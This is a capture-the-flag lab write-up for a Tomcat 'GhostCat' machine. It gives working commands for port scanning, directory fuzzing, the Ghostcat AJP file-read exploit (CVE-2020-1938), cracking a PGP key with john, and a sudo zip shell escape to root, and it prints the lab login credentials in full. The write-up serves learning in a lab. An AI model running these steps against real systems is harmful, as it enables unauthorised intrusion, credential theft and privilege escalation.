quick nmap to figure out ports open </br>
nmap -p- -T5 10.10.89.166 -v </br>
PORT     STATE SERVICE</br>
22/tcp   open  ssh</br>
53/tcp   open  domain</br>
8009/tcp open  ajp13</br>
8080/tcp open  http-proxy</br>
MAC Address: 02:21:27:01:09:83 (Unknown)</br>
</br>
Then, on identified ports, check out more info </br>
</br>
nmap 22,53,8009,8080 -T3 -A 10.10.89.166 -v</br>
PORT     STATE SERVICE    VERSION</br>
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</br>
| ssh-hostkey: </br>
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)</br>
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)</br>
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)</br>
53/tcp   open  tcpwrapped</br>
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)</br>
| ajp-methods: </br>
|_  Supported methods: GET HEAD POST OPTIONS</br>
8080/tcp open  http       Apache Tomcat 9.0.30</br>
|_http-favicon: Apache Tomcat</br>
| http-methods: </br>
|_  Supported Methods: GET HEAD POST OPTIONS</br>
|_http-title: Apache Tomcat/9.0.30</br>
MAC Address: 02:21:27:01:09:83 (Unknown)</br>
</br>
Investigate the apache on 8080, http should be a webserver, so open it in a web browser </br>
![interesting](https://github.com/user-attachments/assets/2df18ff9-3c2d-4702-ba96-e96932c311c4)
</br> (I find the following 2 as interesting and take particular note, since they're both Apache and may have some interconnectedness. This is some web-server thing, so that's promising for web enumeration)
</br>8080/tcp open  http       Apache Tomcat 9.0.30
</br>8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
</br>
apache tomcat Apache Tomcat/9.0.30 shown in browser, aligns with the port scan.
</br> links from the control buttons are disallowed, but they do leak some possible deeper directories as opportunities for enumeration later... possibly
</br> ![dirLead1](https://github.com/user-attachments/assets/d9d30f3d-b41c-4184-9675-b516f031b2ec)
</br> Anything else blocked on the default robots.txt file? 
![hiddenRobots](https://github.com/user-attachments/assets/a74d9916-5924-4cf7-b1c1-125f617c81b4)
</br> (seems we can't even view that, so in a final report, we got at least one good thing that the target is doing. )

</br> let's do our own dirbusting.

</br> <b> wfuzz -c -f sub-fighter -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 62 -u http://10.10.89.166:8080/FUZZ -R 2<b> 
</br> In plain English:
</br>fuzz directories using a mid wordlist, cutting out the responses at 62 words,
</br>which was the error/not found response length found by running this once briefly without the --hw, then again to filter it.
</br> specificially use port 8080 on the indicated url, and look to a depth of 2 in all directories found.

</br> I do some google searches on the apache services/versions we found while letting that run in the background.
</br> CVE 2020-1938 seems to be an identifier that's relevant... I picked this up from a few breadcrumbs.
</br> ![writeup23r32](https://github.com/user-attachments/assets/966813d6-3eed-4955-8f4e-183cc01ce6fb)
</br>![keynameGhostcatFound](https://github.com/user-attachments/assets/f65d4fcd-616c-4b6c-806c-b1ab59882acd)
</br> It's also called "ghostcat" and it turns out exploit DB has it
</br> *POINT FOR IMPROVEMENT: searching "searchsploit" from Kali would have helped... I could become more efficient in hindsight.
</br> Below is the header for the exploit DB entry.
![pythonfile324](https://github.com/user-attachments/assets/2fed8522-b9e5-4e7c-b3dd-6ca593609c42)
</br> I can find the arguments used in a script with arg parser
![lookAtArgsAttachedToModule](https://github.com/user-attachments/assets/a80a2727-bd92-448c-85b7-da4e1b991027)
</br> There's no good explanation of how to "read" code enough such that you can say you "understand" it.
</br> Educational materials on this topic, reading exploit DB code before running, needs expansion.

</br> (40 min mark reached) 
</br> Wfuzz results
</br>
ID           Response   Lines    Word     Chars       Payload    </br>                                                              </br>
===================================================================</br>
</br>
000000090:   302        0 L      0 W      0 Ch        "docs"          </br>                 
000000902:   302        0 L      0 W      0 Ch        "examples"     </br>
000004889:   302        0 L      0 W      0 Ch        "manager"     </br>
000005230:   404        0 L      62 W     709 Ch      "adsl" </br>
Not a whole lot, to be honest. Might do further busting, but this all seems pretty standard so far</br>
focusing instead on the exploit DB hit. </br>
the relevant version of ghostcat is at https://www.exploit-db.com/exploits/48143 </br>
<b> python 48143.py 10.10.89.166 -p 8009 -f WEB-INF/web.xml </b>

</br> Note, there is a full path for the file I’m using with -f : 
</br>/usr/share/wordlists/SecLists/Web-Shells/laudanum-0.8/jsp/warfiles/WEB-INF/web.xml 
</br> This is visible in the SecLists repository if you want to read more about it.
</br> here's the args explained in a screenshot 
![lookAtArgsAttachedToModule](https://github.com/user-attachments/assets/baee1f2a-b9f7-4b4e-8f6a-48c09aa28485)


</br> <h2> truncated output: </h2>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"</br> 
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</br> 
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee</br> 
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</br> 
  version="4.0"</br> 
  metadata-complete="true"></br> </br> 
  <display-name>Welcome to Tomcat</display-name></br> 
  <description></br> 
     Welcome to GhostCat</br> 
	skyfuck:8730281lkjlkjdqlksalks</br> 
  </description></br> 
</web-app></br> 

</br> Nice username, bro. 
</br> Got creds: <b> skyfuck:8730281lkjlkjdqlksalks </b>
</br> ssh in as that user
![sshInAsSkyfuck](https://github.com/user-attachments/assets/042eb2de-0d16-4255-8dd3-cc5e19179468)
</br> looking around, we see a pgp and asc file, both of these are encrypted somehow.

![odd98h43t3t](https://github.com/user-attachments/assets/96d283ff-bc8e-4baa-aeb8-35bbd3291ad8)
</br> we want to grab these for the Atk machine to crack them
</br> <b> credential.pgp</b> 
</br> <b> tryhackme.asc</b> 
</br> scp can help us copy stuff via ssh (essentially)
![scpOfTargetFile2](https://github.com/user-attachments/assets/0ad1d6a9-2b0d-4b57-9866-c25d103cec1f)

</br> <b> scp skyfuck@10.10.89.166:tryhackme.asc </b>
</br> I google how to use john the ripper for pgp/.gpg, since this is a new process for me.
![researchHowToCrack](https://github.com/user-attachments/assets/781cf4a5-e98e-4ca8-aefe-f2a2b6fe74bb)

</br> Seems there are 2 steps
![openwall1](https://github.com/user-attachments/assets/e51b9430-c6ef-4720-bbd8-41a225759d25)
</br> 1) run gpg2john on the asc file that’s encrypted
</br> <b>gpg2john tryhackme.asc > decryptedTryhackme</b>
</br> 2) use john the ripper to figure out the decrypted hash
</br><b> john --wordlist=/usr/share/wordlists/rockyou.txt decryptedTryhackme</b>
</br> example output shown below, we get : alexandru
![decryptWithJohnSyn22](https://github.com/user-attachments/assets/f29fef7c-9459-49ed-a7fa-8171086f8ed3)
</br> GPG is used to read an asc file as follows, e.g. to read tryhackme.asc
</br> <b> gpg --import tryhackme.asc </b>
</br> it expects a password 
![popupForGPGcomesup](https://github.com/user-attachments/assets/4c93e261-86cc-4fd8-846f-f80b12c12958)

</br> then to decrypt, use <b> gpg --decrypt credential.pgp </b> and it asks again for the same pass
</br>![potewniwetwe](https://github.com/user-attachments/assets/09a16118-a46c-4d9f-91b2-3933fb702152)

</br>merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
</br> use those credentials to login : ssh merlin@<ip>  
</br> enumerating with history was nothing interesting
</br> no cronjobs
</br> sudo -l (*quite promising)
</br> ![privEscPath](https://github.com/user-attachments/assets/04bd6e5d-eb72-42fc-aa34-ffbdc3297f05)
</br> see if env can give us a GTFO-bin
</br> researched env on gtfo bins; took some trial and error to understand the syntax and augment the site's reference
</br> TF=$(mktemp -u) 
</br> (then enter and on a new console-line...)
</br> sudo zip $TF /etc/hosts -T -TT 'sh #'
</br> GTFO bins does not have "sudo" prepended in its example, but it's necessary for this env breakout.
![gtfoBinsApplied2](https://github.com/user-attachments/assets/b41379dc-d803-4c3e-972a-6c6537e2af9c)
</br> That gives root access, and the screencap shows navigating to the target "root.txt"
